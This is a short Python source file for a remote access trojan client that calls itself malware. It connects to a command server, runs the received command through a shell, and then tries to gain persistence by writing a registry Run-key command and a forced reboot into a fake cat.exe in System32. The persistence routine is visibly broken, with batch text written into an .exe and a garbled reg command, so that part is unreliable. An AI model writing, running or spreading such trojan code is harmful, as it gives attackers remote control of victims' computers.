import os
import socket
import subprocess

class RatClient:
    def __init__(self, host='127.0.0.1', port=9999):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket = None
        self.beaconing()

    def beaconing(self):
        try:
            self.sock.connect((self.host, self.port))
            print('Connected to server.')
        except Exception as e:
            print(f'Error connecting to server: {e}')
            exit(1)

    def receive_command(self):
        command = self.sock.recv(1024).decode()
        return command

    def execute_command(self, command):
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = result.communicate()
        return output.decode(), error.decode()

    def persistence(self):
        if os.path.exists('C:\\Windows\\System32\\cat.exe'):
            print("The malware is already persistent. No need to reconfigure.")
            return

        file_path = 'C:\\Windows\\System32\\cat.exe'
        cat_binary = r'@echo off\r\nbin\\ /reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MyRAT" /f "%windir%\system32\cat.exe" /p >nul && shutdown -r /t 0'

        with open(file_path, 'wb') as f:
            f.write(bytes(cat_binary, 'UTF-8'))

        print(f"Added persistence in {file_path}")

if __name__ == '__main__':
    rat_client = RatClient()
    command = rat_client.receive_command()

    output, error = rat_client.execute_command(command)

    if error:
        print(f'Error executing command: {error}')
    else:
        print(f'Command executed successfully: {output}')

    rat_client.persistence()
